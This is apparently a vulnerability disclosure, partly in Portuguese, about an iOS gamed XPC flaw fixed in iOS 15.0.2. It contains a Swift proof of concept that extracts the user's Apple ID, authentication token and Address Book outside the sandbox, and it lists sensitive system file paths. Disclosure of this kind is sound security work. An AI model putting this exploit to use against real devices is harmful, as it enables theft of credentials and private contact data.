# iOS gamed exploit (fixed in 15.0.2)

**Atualização: a Apple corrigiu isso discretamente no iOS 15.0.2 sem nenhum tipo de reconhecimento público ou crédito.**

Qualquer aplicativo instalado da App Store pode acessar os seguintes dados sem qualquer solicitação do usuário:
- E-mail do ID Apple e nome completo associado a ele
- Token de autenticação Apple ID que permite acessar pelo menos um dos endpoints em *.apple.com em nome do usuário
- Acesso completo de leitura do sistema de arquivos ao banco de dados Core Duet (contém uma lista de contatos do Mail, SMS, iMessage, aplicativos de mensagens de terceiros e metadados sobre todas as interações do usuário com esses contatos (incluindo timestamps e estatísticas), também alguns anexos (como URLs e textos))
- Acesso completo de leitura do sistema de arquivos ao banco de dados Speed ​​Dial e ao banco de dados Address Book, incluindo fotos de contato e outros metadados, como datas de criação e modificação (acabei de verificar no iOS 15 e este inacessível, então isso deve ter sido corrigido silenciosamente)



Aqui está uma pequena prova de conceito.

```swift
let connection = NSXPCConnection(machServiceName: "com.apple.gamed", options: NSXPCConnection.Options.privileged)!
let proxy = connection.remoteObjectProxyWithErrorHandler({ _ in }) as! GKDaemonProtocol
let pid = ProcessInfo.processInfo.processIdentifier
proxy.getServicesForPID(pid, localPlayer: nil, reply: { (accountService, _, _, _, _, _, _, _, utilityService, _, _, _, _) in
	accountService.authenticatePlayerWithExistingCredentials(handler: { response, error in
		let appleID = response.credential.accountName
		let token = response.credential.authenticationToken
	}

	utilityService.requestImageData(for: URL(fileURLWithPath: "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"), subdirectory: nil, fileName: nil, handler: { data in
		let addressBookData = data
	}
}
```

How it happens:
- XPC service `com.apple.gamed` doesn't properly check for `com.apple.developer.game-center` entitlement
- Even if Game Center is disabled on the device, invoking `getServicesForPID:localPlayer:reply:` returns several XPC proxy objects (`GKAccountService`, `GKFriendService`, `GKUtilityService`, etc.).
- If game center is enabled on the device (even if it's not enabled for the app in App Store Connect and app doesn't contain `com.apple.developer.game-center` entitlement), invoking `authenticatePlayerWithExistingCredentialsWithHandler:` on `GKAccountService` returns an object containing Apple ID of the user, DSID and Game Center authentication token (which allows to send requests to `https://gc.apple.com` on behalf of the user). Invoking `getProfilesForPlayerIDs:handler:` on GKProfileService returns an object containing first and last name of the user's Apple ID. Invoking `getFriendsForPlayer:handler:` on `GKFriendService` return an object with information about user's friend in Game Center.
- Even if game center is disabled, it's not enabled for the app in App Store Connect and app doesn't contain `com.apple.developer.game-center` entitlement, invoking `requestImageDataForURL:subdirectory:fileName:handler:` on `GKUtilityService` allows to read arbitrary files outside of the app sandbox by passing file URLs to that method. Among the files (but not limited to) that can be accessed that way are the following:
`/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist` - contains mobile gestalt cache
`/var/mobile/Library/CoreDuet/People/interactionC.db` - contains a list of contacts from Mail, SMS, iMessage, 3rd-party messaging apps and metadata about user's interaction with these contacts (including timestamps and statistics)
`/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist` - contains favorite contacts and their phone numbers
`/var/mobile/Library/AddressBook/AddressBook.sqlitedb` - contains complete Address Book database
`/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb` - contains photos of Address book contacts
- Invoking `cacheImageData:inSubdirectory:withFileName:handler:` on GKUtilityService might allow to write arbitrary data to a location outside of the app sandbox.

Em [Apple Security Bounty Program page](https://developer.apple.com/security-bounty/payouts/) essa vulnerabilidade é avaliada em US$ 100.000 (acesso amplo do aplicativo a dados confidenciais normalmente protegidos por um prompt de TCC ou pela sandbox da plataforma. O acesso a “dados confidenciais” inclui obter um acesso amplo (ou seja, o banco de dados completo) de Contatos).
